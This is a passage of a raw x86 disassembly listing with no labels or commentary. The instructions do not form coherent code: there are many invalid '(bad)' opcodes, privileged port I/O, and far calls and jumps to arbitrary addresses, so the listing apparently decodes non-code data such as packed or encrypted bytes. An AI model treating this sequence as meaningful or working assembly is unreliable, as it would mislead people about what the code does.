  4159c8:	dec    eax
  4159c9:	jmp    0x415a22
  4159cb:	mov    esi,0x977fa491
  4159d0:	dec    edx
  4159d1:	in     al,0x86
  4159d3:	lea    ebx,es:[edi]
  4159d6:	mov    ah,0x62
  4159d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4159d9:	and    bl,BYTE PTR [edx+0x18a09eba]
  4159df:	clc    
  4159e0:	call   0xba98:0x5ae2b7c9
  4159e7:	or     eax,0xb1ae71ed
  4159ec:	or     BYTE PTR ds:0x4070ad15,bl
  4159f2:	mov    edx,0xd1372621
  4159f7:	pop    ecx
  4159f8:	xor    bh,cl
  4159fa:	pop    esi
  4159fb:	push   edx
  4159fc:	int3   
  4159fd:	mov    dh,0xf1
  4159ff:	sti    
  415a00:	clc    
  415a01:	aam    0x4f
  415a03:	shl    eax,0x27
  415a06:	mov    al,0x73
  415a08:	pop    eax
  415a09:	pop    eax
  415a0a:	int    0x50
  415a0c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415a0d:	jns    0x415a36
  415a0f:	shr    DWORD PTR [ebp+ecx*8-0x26d6dac5],0x52
  415a17:	in     eax,0xde
  415a19:	rcl    BYTE PTR [esi-0x80],cl
  415a1c:	rol    edx,1
  415a1e:	test   al,0xcf
  415a20:	mov    al,ds:0xa4944aee
  415a25:	xor    al,0xb7
  415a27:	test   BYTE PTR [esi+0x30],ah
  415a2a:	sub    DWORD PTR [esi],ebp
  415a2c:	(bad)  
  415a2d:	fstp   DWORD PTR [esi]
  415a2f:	movaps xmm7,xmm2
  415a32:	out    0xd5,al
  415a34:	cmp    DWORD PTR [bx+di-0x2f],esp
  415a38:	sbb    al,0xda
  415a3a:	stos   DWORD PTR es:[edi],eax
  415a3b:	sub    bh,BYTE PTR [ebp+0x3f7add2c]
  415a41:	ret    
  415a42:	push   cs
  415a43:	retf   
  415a44:	dec    edx
  415a45:	aas    
  415a46:	push   esi
  415a47:	lahf   
  415a48:	imul   ebp,DWORD PTR [ebx+0x203d912e],0x7097a571
  415a52:	or     dh,BYTE PTR es:[ecx-0x6ccd72]
  415a59:	pop    esi
  415a5a:	pushf  
  415a5b:	test   al,0x7f
  415a5d:	xor    al,0x6c
  415a5f:	push   ds
  415a60:	adc    eax,0xdd0a1c4
  415a65:	or     ebx,ecx
  415a67:	lock or eax,0x67b0bb63
  415a6d:	mov    ebp,0x66f3bece
  415a72:	fsub   QWORD PTR [edi-0x4d]
  415a75:	xor    esi,DWORD PTR [ecx+ebx*1-0x51b0bd06]
  415a7c:	jmp    0x415a0a
  415a7e:	aam    0xd7
  415a80:	ins    DWORD PTR es:[edi],dx
  415a81:	push   esp
  415a82:	test   DWORD PTR [ebx+edx*8+0x30303fc1],edi
  415a89:	pop    edi
  415a8a:	xor    al,0x85
  415a8c:	fs (bad) 
  415a8e:	mov    ebp,0x25af6024
  415a93:	add    ch,BYTE PTR [edi+0x4ea80494]
  415a99:	cli    
  415a9a:	lea    edi,[ebp-0x4]
  415a9d:	fcmovne st,st(6)
  415a9f:	mov    ds:0x7156f985,eax
  415aa4:	mov    al,ds:0xf4dabe24
  415aa9:	mov    ch,BYTE PTR [edx+esi*2-0x6fb7177f]
  415ab0:	mov    esp,0xdc842b9
  415ab5:	adc    ebp,DWORD PTR [esp+ebp*2+0x4e99085]
  415abc:	test   DWORD PTR [ecx+0x40],esi
  415abf:	pushf  
  415ac0:	mov    fs,WORD PTR [edx+0x6b]
  415ac3:	inc    eax
  415ac4:	xor    eax,0xe5229973
  415ac9:	in     al,0xe6
  415acb:	or     BYTE PTR [esi+edi*1],bh
  415ace:	pop    ebp
  415acf:	or     bl,bh
  415ad1:	sub    DWORD PTR [ebx+0x5d2ec115],esp
  415ad7:	jl     0x415b25
  415ad9:	cmp    DWORD PTR [edx+0xab7773b],eax
  415adf:	jmp    0x415aaf
  415ae1:	fisub  WORD PTR [edx-0x6b2ee1c1]
  415ae7:	and    edi,DWORD PTR [ebp+0x3676a2b6]
  415aed:	adc    BYTE PTR [edi+0x58],al
  415af0:	mov    cl,0x8f
  415af2:	jp     0x415b32
  415af4:	adc    BYTE PTR [ebp+0x9d31741],bh
  415afa:	enter  0x5d1,0xd7
  415afe:	or     ecx,ebx
  415b00:	push   ebx
  415b01:	adc    al,0x56
  415b03:	pop    esi
  415b04:	sub    al,0xad
  415b06:	lds    edi,FWORD PTR [esi-0x6597da17]
  415b0c:	and    ebx,esi
  415b0e:	ds pop ebp
  415b10:	loop   0x415a92
  415b12:	mov    esp,0x812b7b77
  415b17:	push   edi
  415b18:	lods   al,BYTE PTR ds:[esi]
  415b19:	xor    al,bl
  415b1b:	sub    ecx,DWORD PTR [ebx]
  415b1d:	mov    edx,0x1cd78ac
  415b22:	mov    ecx,DWORD PTR [edx+0x46]
  415b25:	icebp  
  415b26:	pop    ecx
  415b27:	add    BYTE PTR [edi],0xfb
  415b2a:	sub    dl,ch
  415b2c:	ret    
  415b2d:	adc    edx,DWORD PTR [ebp+0x28]
  415b30:	sub    ebp,DWORD PTR [edi]
  415b32:	loop   0x415b8e
  415b34:	lea    esp,[ebp-0x242cd2e6]
  415b3a:	(bad)  
  415b3b:	jg     0x415b96
  415b3d:	xor    al,0x9c
  415b3f:	dec    ebp
  415b40:	or     edi,edi
  415b42:	std    
  415b43:	sti    
  415b44:	xlat   BYTE PTR ds:[ebx]
  415b45:	pop    ss
  415b46:	mov    al,ds:0x6d8bb70
  415b4b:	popf   
  415b4c:	jecxz  0x415b88
  415b4e:	mov    ebp,0x67eba540
  415b53:	mov    ds:0x3253c89b,al
  415b58:	in     al,0xb3
  415b5a:	arpl   di,dx
  415b5c:	es loop 0x415b95
  415b5f:	(bad)  
  415b60:	dec    ebp
  415b61:	fld    QWORD PTR [edi-0xe]
  415b64:	into   
  415b65:	in     eax,0xd2
  415b67:	push   DWORD PTR [eax]
  415b69:	out    dx,al
  415b6a:	test   eax,0x148c49c7
  415b6f:	cmp    esi,DWORD PTR [ecx+0x1d83b10b]
  415b75:	or     BYTE PTR [ecx-0x27],dl
  415b78:	or     al,0xba
  415b7a:	fidiv  DWORD PTR [esi-0x3f0271c0]
  415b80:	fwait
  415b81:	in     al,0xdf
  415b83:	xchg   ebx,eax
  415b84:	stc    
  415b85:	mov    ds:0x99d0af5b,eax
  415b8a:	pop    esp
  415b8b:	ins    DWORD PTR es:[edi],dx
  415b8c:	cmc    
  415b8d:	xor    al,bh
  415b8f:	inc    ebx
  415b90:	jle    0x415bbb
  415b92:	sbb    eax,0xfb628c01
  415b97:	push   0x356286a4
  415b9c:	and    al,0xf8
  415b9e:	xor    edi,edx
  415ba0:	and    BYTE PTR [ebp+0x9],bl
  415ba3:	pop    esi
  415ba4:	cld    
  415ba5:	lods   eax,DWORD PTR ds:[esi]
  415ba6:	shl    DWORD PTR [eax-0x73e7133f],cl
  415bac:	push   eax
  415bad:	dec    ecx
  415bae:	leave  
  415baf:	fstp   DWORD PTR [ecx-0x25076a25]
  415bb5:	sbb    al,BYTE PTR ds:0x7feb5fc2
  415bbb:	or     al,0x7f
  415bbd:	in     eax,dx
  415bbe:	or     ebp,DWORD PTR [ebx]
  415bc0:	jo     0x415bb7
  415bc2:	mov    bl,0x6d
  415bc4:	not    eax
  415bc6:	xchg   ecx,eax
  415bc7:	dec    eax
  415bc8:	xor    esi,eax
  415bca:	xor    al,0x94
  415bcc:	out    dx,eax
  415bcd:	ror    eax,0x7
  415bd0:	lods   al,BYTE PTR ds:[esi]
  415bd1:	mov    edi,0xe8f5c4e6
  415bd6:	fwait
  415bd7:	sbb    ebp,DWORD PTR [eax+0x1e]
  415bda:	push   esi
  415bdb:	(bad)  
  415bdd:	inc    ebx
  415bde:	popf   
  415bdf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415be0:	lock xchg ebx,eax
  415be2:	lahf   
  415be3:	mov    dh,0x86
  415be5:	mov    bh,0x35
  415be8:	push   edx
  415be9:	pop    ecx
  415bea:	ret    
  415beb:	dec    DWORD PTR [eax]
  415bed:	inc    ebx
  415bee:	mov    edx,0x69efd2f6
  415bf3:	fnstcw WORD PTR [ecx]
  415bf5:	ror    BYTE PTR [ebx+0x3],cl
  415bf8:	sub    al,0xf8
  415bfa:	sti    
  415bfb:	push   ds
  415bfc:	pop    eax
  415bfd:	pushf  
  415bfe:	imul   eax,DWORD PTR [edi],0x3a
  415c01:	and    al,0x4e
  415c03:	cmp    DWORD PTR [eax-0x2f],edx
  415c06:	fptan  
  415c08:	call   0xc7a4f318
  415c0d:	mov    bh,0x76
  415c0f:	in     eax,0xb6
  415c11:	das    
  415c12:	out    0x66,al
  415c14:	scas   al,BYTE PTR es:[edi]
  415c15:	xchg   edi,eax
  415c16:	jbe    0x415c93
  415c18:	inc    ebp
  415c19:	aas    
  415c1a:	fisub  WORD PTR [ecx-0x1c9bd1d5]
  415c20:	xchg   ecx,eax
  415c21:	xor    DWORD PTR cs:[esi-0x40],0x4ab27448
  415c29:	fdiv   DWORD PTR [eax]
  415c2b:	jno    0x415c8a
  415c2d:	pop    edi
  415c2e:	(bad)  
  415c30:	bound  eax,QWORD PTR [edx+0x34abbcbf]
  415c36:	jnp    0x415c52
  415c38:	into   
  415c39:	in     al,dx
  415c3a:	dec    esi
  415c3b:	icebp  
  415c3c:	push   0x7495327f
  415c41:	jge    0x415c52
  415c43:	mov    ecx,0xda9c7ab8
  415c48:	shl    BYTE PTR [edx-0x1b517315],0xa2
  415c4f:	inc    ecx
  415c50:	pop    edi
  415c51:	lods   eax,DWORD PTR ds:[esi]
  415c52:	mov    al,ds:0x8be7bde4
  415c57:	div    BYTE PTR ds:0x2ecbdf46
  415c5d:	fisttp QWORD PTR [edx]
  415c5f:	mov    ah,0x66
  415c61:	cmp    al,0xc2
  415c63:	xor    DWORD PTR [edx],ebx
  415c65:	cwde   
  415c66:	neg    BYTE PTR [ebp-0x57]
  415c69:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415c6a:	ror    ebx,1
  415c6c:	loope  0x415c0e
  415c6e:	cvtpi2pd xmm1,QWORD PTR [edx]
  415c72:	mov    BYTE PTR [eax-0x3e],ch
  415c75:	icebp  
  415c76:	iret   
  415c77:	xchg   BYTE PTR [esi-0x6b39f0bc],dh
  415c7d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415c7e:	ins    BYTE PTR es:[edi],dx
  415c7f:	sub    dl,bl
  415c81:	cmp    ebx,ebx
  415c83:	outs   dx,DWORD PTR ds:[esi]
  415c84:	and    DWORD PTR [eax-0x8],ebp
  415c87:	les    ecx,FWORD PTR [eax-0x48af751]
  415c8d:	out    dx,al
  415c8e:	shl    BYTE PTR [ecx-0x5d660c63],0x9d
  415c95:	outs   dx,DWORD PTR ds:[esi]
  415c96:	jnp    0x415cbb
  415c98:	scas   eax,DWORD PTR es:[edi]
  415c99:	and    al,0x3c
  415c9b:	call   0x7ff8:0x5a0e336d
  415ca2:	xchg   ebp,eax
  415ca3:	adc    DWORD PTR [edx+edx*8-0x5b02518a],edi
  415caa:	rcr    DWORD PTR [ebx],0xa8
  415cad:	outs   dx,BYTE PTR ds:[esi]
  415cae:	rcr    BYTE PTR [ebp+0x5ee09556],cl
  415cb4:	or     BYTE PTR [edx-0xc],al
  415cb7:	fimul  WORD PTR [edi]
  415cb9:	dec    esp
  415cba:	inc    esi
  415cbb:	mov    ch,0xb2
  415cbd:	mov    al,0xca
  415cbf:	dec    ecx
  415cc0:	mov    ds:0x4dcf168e,eax
  415cc5:	xchg   edx,eax
  415cc6:	rcl    al,cl
  415cc8:	inc    edi
  415cc9:	mov    esi,0xd29ccde
  415cce:	addr16 out 0x72,eax
  415cd1:	mov    ecx,esi
  415cd3:	fisub  WORD PTR ds:0xa9295a0c
  415cd9:	popf   
  415cda:	mov    BYTE PTR [ecx+0x7aeb731c],al
  415ce0:	jg     0x415c68
  415ce2:	sub    dh,bh
  415ce4:	and    eax,0xaebf37f3
  415ce9:	(bad)  
  415cea:	ret    0x7c4d
  415ced:	fsubr  QWORD PTR [ebx+eax*1]
  415cf0:	mov    al,ds:0x790f18d9
  415cf5:	xlat   BYTE PTR ds:[ebx]
  415cf6:	sbb    al,0x1c
  415cf8:	dec    edi
  415cf9:	mov    cl,0x2a
  415cfb:	outs   dx,BYTE PTR fs:[esi]
  415cfd:	sbb    eax,0x1836bf4e
  415d02:	arpl   WORD PTR [eax+0x3a],di
  415d05:	loopne 0x415cc9
  415d07:	xor    eax,0x5b8c0f4f
  415d0c:	dec    edi
  415d0d:	cmp    eax,0x64bdabb
  415d12:	(bad)  
  415d13:	lods   eax,DWORD PTR ds:[esi]
  415d14:	push   ebx
  415d15:	or     al,0x13
  415d17:	adc    BYTE PTR [ebx+0xaf3576],cl
  415d1d:	mov    BYTE PTR [edi+0x4344579],al
  415d23:	xor    ebx,DWORD PTR [ebx+0x57]
  415d26:	out    0x1f,eax
  415d28:	pop    edi
  415d29:	leave  
  415d2a:	in     al,0x30
  415d2c:	pmuludq mm2,QWORD PTR [edx]
  415d2f:	and    bh,BYTE PTR [ebp+0x5c57706]
  415d35:	add    eax,0x8e2b3e55
  415d3a:	sbb    dh,al
  415d3c:	gs add edi,0xffffff91
  415d40:	bsf    edx,DWORD PTR [esi+0x6e]
  415d44:	pop    ebp
  415d45:	cmp    al,0xca
  415d47:	loop   0x415d41
  415d49:	fidivr WORD PTR [edi+ebx*2+0x67690855]
  415d50:	xor    edx,edi
  415d52:	fwait
  415d53:	pop    edx
  415d54:	aam    0xb4
  415d56:	or     al,0x34
  415d58:	(bad)
  415d5c:	pop    ecx
  415d5d:	push   es
  415d5e:	fwait
  415d5f:	and    al,0xab
  415d61:	jmp    0x415d93
  415d63:	cmc    
  415d64:	repz inc ebx
  415d66:	inc    eax
  415d67:	nop
  415d68:	xor    ebp,DWORD PTR [edi+ebp*8]
  415d6b:	pop    ecx
  415d6c:	cmovne eax,DWORD PTR [ecx-0x46e88569]
  415d73:	fst    QWORD PTR [ecx]
  415d75:	cmc    
  415d76:	inc    edx
  415d77:	lods   eax,DWORD PTR ds:[esi]
  415d78:	int3   
  415d79:	mov    eax,ds:0x2fd1877b
  415d7e:	xlat   BYTE PTR ds:[ebx]
  415d7f:	push   0xc0c9e6c0
  415d84:	push   ds
  415d85:	retf   0x9199
  415d88:	sahf   
  415d89:	inc    ebp
  415d8a:	in     eax,0x47
  415d8c:	lods   al,BYTE PTR ds:[esi]
  415d8d:	pop    eax
  415d8e:	repz fnstenv [eax+0x6edc0c67]
  415d95:	ret    
  415d96:	push   ebx
  415d97:	or     esi,DWORD PTR [ecx-0x7f]
  415d9a:	inc    ebp
  415d9b:	out    0xa6,al
  415d9d:	xlat   BYTE PTR ds:[ebx]
  415d9e:	adc    DWORD PTR ds:0x68fb4180,edi
  415da4:	imul   esi,DWORD PTR [ebp-0x20fc0a],0x8bc9c9a3
  415dae:	lods   eax,DWORD PTR ds:[esi]
  415daf:	cs ss push edx
  415db2:	xchg   esi,eax
  415db3:	or     cl,bl
  415db5:	inc    ebp
  415db6:	test   BYTE PTR [edx],0xb5
  415db9:	or     dh,ah
  415dbb:	and    BYTE PTR [ebx+0x4f],cl
  415dbe:	in     eax,0x51
  415dc0:	test   eax,0x4831618b
  415dc5:	pop    ebx
  415dc6:	mov    DWORD PTR [edi+eax*2+0x53ce3657],edi
  415dcd:	in     al,dx
  415dce:	xor    al,0xdc
  415dd0:	or     eax,0x6b372117
  415dd5:	lods   al,BYTE PTR ds:[esi]
  415dd6:	(bad)  [esi-0x50b526da]
  415ddc:	adc    BYTE PTR [ecx-0x54cecb08],ch
  415de2:	sti    
  415de3:	or     al,0x40
  415de5:	xlat   BYTE PTR ds:[ebx]
  415de6:	add    DWORD PTR [esi-0x77],0xf8bbf46b
  415ded:	js     0x415db3
  415def:	or     DWORD PTR [edx+0x3517cfa9],0x7c
  415df6:	pop    ecx
  415df7:	in     al,0x81
  415df9:	xlat   BYTE PTR ds:[ebx]
  415dfa:	inc    edi
  415dfb:	push   ebx
  415dfc:	jb     0x415e40
  415dfe:	(bad)  
  415dff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415e00:	push   edx
  415e01:	(bad)  
  415e02:	mov    bh,0x65
  415e04:	fbld   TBYTE PTR [esi+0x2e]
  415e07:	cmp    dl,BYTE PTR [ecx]
  415e09:	lahf   
  415e0a:	cmp    al,0xd9
  415e0c:	pushf  
  415e0d:	(bad)  
  415e0f:	test   DWORD PTR [edx],eax
  415e11:	repz inc eax
  415e13:	fist   WORD PTR [eax]
  415e15:	mov    cl,0x58
  415e17:	pop    edi
  415e18:	in     eax,dx
  415e19:	push   cs
  415e1a:	imul   ecx,DWORD PTR [edx-0x3fe62b09],0xffffffb6
  415e21:	aam    0xc2
  415e23:	js     0x415e91
  415e25:	sub    eax,DWORD PTR ds:0x828647ce
  415e2b:	pop    esp
  415e2c:	call   0x6a12:0xb0c449b6
  415e33:	mov    ebx,0x86c7381
  415e38:	loopne 0x415e5a
  415e3a:	fwait
  415e3b:	jnp    0x415e83
  415e3d:	inc    esi
  415e3e:	in     al,dx
  415e3f:	repz jne 0x415e9d
  415e42:	cmp    DWORD PTR ds:0x8cbdacba,edx
  415e48:	ret    
  415e49:	dec    esp
  415e4a:	(bad)  
  415e4b:	and    eax,0x752d2af8
  415e50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415e51:	adc    DWORD PTR [ebx-0x71],edx
  415e54:	icebp  
  415e55:	add    esi,ebp
  415e57:	(bad)  
  415e58:	aas    
  415e59:	imul   edi,DWORD PTR [esi-0x6b0116aa],0xffffffa3
  415e60:	ror    DWORD PTR [ebp-0x3d],cl
  415e63:	cmp    dl,BYTE PTR [eax]
  415e65:	mov    ch,0x73
  415e67:	pop    ds
  415e68:	mov    al,0x60
  415e6a:	call   0xafd7:0x32252dd4
  415e71:	xor    eax,0x8efcf321
  415e76:	pop    edi
  415e77:	(bad)  
  415e78:	aam    0xfc
  415e7a:	loope  0x415e85
  415e7c:	and    al,0xec
  415e7e:	lods   eax,DWORD PTR ds:[esi]
  415e7f:	jge    0x415e42
  415e81:	fisttp WORD PTR [edi-0x41]
  415e84:	(bad)  
  415e86:	mov    cl,0xa2
  415e88:	mov    ds:0x46797a3a,al
  415e8d:	and    BYTE PTR [eax+0x59],cl
  415e90:	(bad)  
  415e91:	xor    BYTE PTR [esi+0x56],cl
  415e94:	jl     0x415eab
  415e96:	fdiv   QWORD PTR [eax]
  415e98:	inc    ebx
  415e99:	and    eax,0x3b92bcd0
  415e9e:	(bad)  
  415e9f:	sub    eax,0xc2f810aa
  415ea4:	sbb    ah,bh
  415ea6:	cwde   
  415ea7:	ffree  st(7)
  415ea9:	sbb    bh,cl
  415eab:	mov    bh,0x31
  415ead:	mov    dl,0x9a
  415eaf:	push   esp
  415eb0:	push   esi
  415eb1:	xor    BYTE PTR [ecx+0x16],dh
  415eb4:	dec    ebx
  415eb5:	in     al,0xa0
  415eb7:	mov    cl,0xa7
  415eb9:	repz in eax,0x76
  415ebc:	shr    DWORD PTR [ebx+0x39dbe29a],1
  415ec2:	lahf   
  415ec3:	mov    eax,0xb67b034c
  415ec8:	mov    eax,0x648850f6
  415ecd:	push   edi
  415ece:	aam    0x7f
  415ed0:	dec    esp
  415ed1:	out    dx,eax
  415ed2:	(bad)  
  415ed3:	hlt    
  415ed4:	ja     0x415f37
  415ed6:	jns    0x415e86
  415ed8:	adc    eax,0x6263fdd4
  415edd:	ins    BYTE PTR es:[edi],dx
  415ede:	icebp  
  415edf:	xor    ebp,DWORD PTR fs:[edi+0x38]
  415ee3:	daa    
  415ee4:	stos   DWORD PTR es:[edi],eax
  415ee5:	mov    ds:0xe30fb046,eax
  415eea:	dec    ebx
  415eeb:	inc    ebp
  415eec:	xchg   BYTE PTR [ecx+esi*2+0x67befd73],dl
  415ef3:	xor    bl,BYTE PTR [edx+esi*2+0x7f]
  415ef7:	xor    ch,BYTE PTR [ecx]
  415ef9:	push   esp
  415efa:	xchg   DWORD PTR [ebp+eax*1+0xc],esi
  415efe:	sbb    al,0xea
  415f00:	pop    esi
  415f01:	arpl   di,si
  415f03:	sub    al,0x88
  415f05:	outs   dx,BYTE PTR ds:[esi]
  415f06:	xchg   esi,eax
  415f07:	(bad)  
  415f08:	(bad)  
  415f09:	mov    dl,BYTE PTR [eax]
  415f0b:	fcmovnb st,st(5)
  415f0d:	lods   al,BYTE PTR ds:[esi]
  415f0e:	jmp    0x415ec6
  415f10:	add    DWORD PTR [ecx+0x4f46e5e9],edi
  415f16:	leave  
  415f17:	fdiv   st,st(4)
  415f19:	mov    al,0xad
  415f1b:	fcomp  DWORD PTR [ebp+0x2a]
  415f1e:	push   cs
  415f1f:	mov    WORD PTR ds:0xce9242a0,ds
  415f25:	retf   
  415f26:	mov    ch,BYTE PTR [ebp+0x3e]
  415f29:	adc    al,0x85
  415f2b:	fbld   TBYTE PTR [edx-0x51]
  415f2e:	mov    ds:0x38da0c6a,al
  415f33:	push   DWORD PTR [edx-0x77080d4d]
  415f39:	data16 sbb BYTE PTR [ebx],cl
  415f3c:	fnsetpm(287 only) 
  415f3e:	and    DWORD PTR [edx+0x71ebdeed],ebx
  415f44:	dec    esi
  415f45:	repnz cmp edx,DWORD PTR [edi-0x58525ba3]
  415f4c:	or     ecx,DWORD PTR [ebx]
  415f4e:	lods   eax,DWORD PTR ds:[esi]
  415f4f:	(bad)  
  415f50:	jmp    0x415f7d
  415f52:	xor    eax,0x12ca475b
  415f57:	clc    
  415f58:	lock stos DWORD PTR es:[edi],eax
  415f5a:	jp     0x415f60
  415f5c:	in     eax,0x93
  415f5e:	xchg   edi,eax
  415f5f:	into   
  415f60:	mov    ecx,0x880704f8
  415f65:	call   0x5519:0x8a2b20ad
  415f6c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415f6d:	xlat   BYTE PTR ds:[ebx]
  415f6e:	sbb    edx,ecx
  415f70:	test   eax,0xfa0c5a0f
  415f75:	sub    eax,0xf86d17bb
  415f7a:	mov    eax,0x55c5ac28
  415f7f:	dec    esp
  415f80:	mov    ds:0xafe61b97,al
  415f85:	and    ebx,DWORD PTR [edi-0x77182c9e]
  415f8b:	popf   
  415f8c:	jecxz  0x415f34
  415f8e:	dec    esi
  415f8f:	test   BYTE PTR [eax+0x639e9ea6],dh
  415f95:	pop    ebx
  415f96:	add    esi,DWORD PTR ds:0x80782a4d
  415f9c:	sub    eax,0x975691f5
  415fa1:	sar    BYTE PTR gs:[edx-0x622e3cc3],1
  415fa8:	push   ss
  415fa9:	adc    al,0xe8
  415fab:	mov    ds:0x8b8ebc81,eax
  415fb0:	jle    0x415f9f
  415fb2:	imul   esi,edi,0xffffff9f
  415fb5:	sub    edi,esi
  415fb7:	xor    ecx,edx
  415fb9:	pop    ebp
  415fba:	shr    BYTE PTR [edi-0x5e],cl
  415fbd:	fcom   st(7)
  415fbf:	repz push 0xffffffdb
  415fc2:	adc    edi,edi
  415fc4:	test   al,0x4a
  415fc6:	rol    BYTE PTR [ecx+0x331519d2],0x11
  415fcd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415fce:	inc    ecx
  415fcf:	and    eax,0x786a67fd
  415fd4:	sbb    eax,0x90d1a296
  415fd9:	sub    BYTE PTR [ebx],bh
  415fdb:	fisttp WORD PTR [esi+edx*8-0x26]
  415fdf:	xor    DWORD PTR [ebp-0x53],0xffffff9f
  415fe3:	adc    al,bl
  415fe5:	mov    ch,BYTE PTR [esi+edi*4]
  415fe8:	(bad)  
  415fe9:	lods   eax,DWORD PTR ds:[esi]
  415fea:	fucomp st(1)
  415fec:	and    ah,BYTE PTR [esi+0x3dbe10b]
  415ff2:	jae    0x415fb8
  415ff4:	pop    eax
  415ff5:	sahf   
  415ff6:	hlt    
  415ff7:	inc    ecx
  415ff8:	mov    ?,WORD PTR [eax]
  415ffa:	mov    al,0xb5
  415ffc:	lods   al,BYTE PTR ds:[esi]
  415ffd:	dec    edi
  415ffe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415fff:	addr16 or eax,0x6706ef61
  416005:	and    DWORD PTR [edx-0x57],esi
  416008:	cwde   
  416009:	sbb    al,0xc9
  41600b:	xchg   ebp,eax
  41600c:	fcom   DWORD PTR [edi-0x2e]
  41600f:	mov    bl,0x49
  416011:	inc    ecx
  416012:	cmp    DWORD PTR [esi+esi*2+0x9bb27d6],0xffffffe0
  41601a:	mov    dl,BYTE PTR [edi]
  41601c:	cmp    DWORD PTR [eax+0x7d4ee3fa],edx
  416022:	stc    
  416023:	std    
  416024:	shr    BYTE PTR [eax],cl
  416026:	mov    ds:0x52591cba,al
  41602b:	pop    esp
  41602c:	(bad)  
  41602d:	push   ecx
  41602e:	and    cl,BYTE PTR [eax+0xa]
  416031:	mov    ebp,0xe1b4044c
  416036:	adc    dl,BYTE PTR [edx]
  416038:	fistp  QWORD PTR [ebx]
  41603a:	mov    esi,0xc77e46fa
  41603f:	(bad)  
  416040:	out    0xad,eax
  416042:	jl     0x4160c3
  416044:	pop    edx
  416045:	mov    edi,0x6490682a
  41604a:	loop   0x416029
  41604c:	mov    ch,0xf3
  41604e:	adc    ebx,DWORD PTR [ebx*1+0x421d61e0]
  416055:	ins    DWORD PTR es:[edi],dx
  416056:	cmp    ecx,DWORD PTR [edx]
  416058:	pop    ebx
  416059:	xor    esi,DWORD PTR [ebx+0x1a]
  41605c:	dec    ebp
  41605d:	imul   ebx,DWORD PTR [edx],0x5f
  416060:	mov    al,0xaf
  416062:	sub    ah,BYTE PTR [ebx+eiz*2-0x70]
  416066:	and    DWORD PTR [eax-0x251c9233],ebp
  41606c:	mov    WORD PTR fs:[ecx-0xf5ebc89],ss
  416073:	and    bh,dl
  416075:	push   0x4d879234
  41607a:	ins    DWORD PTR es:[edi],dx
  41607b:	imul   edi,DWORD PTR [ebp-0x5d89f1b1],0xfffffff0
  416082:	add    DWORD PTR [esi+esi*8-0x7eeb9911],edx
  416089:	or     DWORD PTR [esi-0x6b],edx
  41608c:	fstp   TBYTE PTR [edx+edx*4-0x2ac679a1]
  416093:	cld    
  416094:	into   
  416095:	cmp    BYTE PTR [edx+edx*8-0x5],bh
  416099:	dec    esp
  41609a:	pop    esp
  41609b:	mov    ds:0x83fef5ec,eax
  4160a0:	xchg   esi,eax
  4160a1:	arpl   WORD PTR [edi],di
  4160a3:	jg     0x416033
  4160a5:	xchg   dx,ax
  4160a7:	mov    edi,0x2943f6f9
  4160ac:	xchg   ebx,eax
  4160ad:	pop    ebx
  4160ae:	loopne 0x4160a8
  4160b0:	(bad)  
  4160b1:	out    dx,eax
  4160b2:	sub    DWORD PTR [esi-0x5b],edx
  4160b5:	jl     0x41606f
  4160b7:	sub    al,0x98
  4160b9:	jge    0x4160c4
  4160bb:	sbb    al,0xf9
  4160bd:	inc    eax
  4160be:	mov    esi,0x9ea39bda
  4160c3:	outs   dx,DWORD PTR ds:[esi]
  4160c4:	aas    
  4160c5:	push   cs
  4160c6:	shr    dh,cl
  4160c8:	mov    al,ds:0x92862d8f
  4160cd:	fmul   DWORD PTR [ecx]
  4160cf:	mov    al,ds:0x84e13ce2
  4160d4:	leave  
  4160d5:	aam    0xe4
  4160d7:	lods   al,BYTE PTR ds:[esi]
  4160d8:	aad    0x72
  4160da:	jg     0x41605d
  4160dc:	dec    ebp
  4160dd:	daa    
  4160de:	xor    DWORD PTR [edi],ebx
  4160e0:	mov    ah,0xad
  4160e2:	sar    BYTE PTR [ebp+0x3e],0xff
  4160e6:	cmp    BYTE PTR [edx+0x6e54d747],0xe7
  4160ed:	sar    DWORD PTR [ebx-0x2fe6a5e],1
  4160f3:	imul   DWORD PTR [edx]
  4160f5:	fstp   TBYTE PTR [ebp+ebp*8-0x74699a6e]
  4160fc:	fidivr DWORD PTR [ebx+edx*8]
  4160ff:	xor    BYTE PTR [esi+0x7],cl
  416102:	mov    dl,BYTE PTR [edx+eax*8]
  416105:	sbb    eax,0xce7a4ef6
  41610a:	dec    BYTE PTR [ebx-0x13332c55]
  416110:	retf   0xabad
  416113:	xchg   ecx,edi
  416115:	cmp    ah,ah
  416117:	js     0x416178
  416119:	adc    ebp,DWORD PTR [edx]
  41611b:	and    DWORD PTR [edx],ebp
  41611d:	lods   eax,DWORD PTR ds:[esi]
  41611e:	aaa    
  41611f:	les    eax,FWORD PTR [edi]
  416121:	(bad)  
  416122:	ficom  WORD PTR [edx+0x5d]
  416125:	rol    edi,0xe5
  416128:	dec    eax
  416129:	jmp    0x93c2:0xb796642b
  416130:	scas   al,BYTE PTR es:[edi]
  416131:	aaa    
  416132:	push   ecx
  416133:	adc    al,0x85
  416135:	push   es
  416136:	jae    0x4161a9
  416138:	mov    ebx,0xad7c36e1
  41613d:	mov    ds:0x5fe45ba1,al
  416142:	sbb    DWORD PTR [edx+0x364ff8ab],eax
  416148:	push   edx
  416149:	push   ss
  41614a:	inc    edi
  41614b:	xchg   ebp,eax
  41614c:	jg     0x416116
  41614e:	xor    al,0x2b
  416150:	mov    DWORD PTR ds:0x640b351b,0xefddca5c
  41615a:	jnp    0x416192
  41615c:	stos   DWORD PTR es:[edi],eax
  41615d:	push   esp
  41615e:	xor    ebx,DWORD PTR [eax-0xc]
  416161:	push   ebx
  416162:	sub    al,0x44
  416164:	inc    esp
  416165:	jecxz  0x4161b8
  416167:	cmc    
  416168:	mov    edi,0xe84d0064
  41616d:	lods   eax,DWORD PTR ds:[esi]
  41616e:	(bad)  
  41616f:	out    0x8b,al
  416171:	jle    0x416199
  416173:	outs   dx,BYTE PTR ds:[esi]
  416174:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
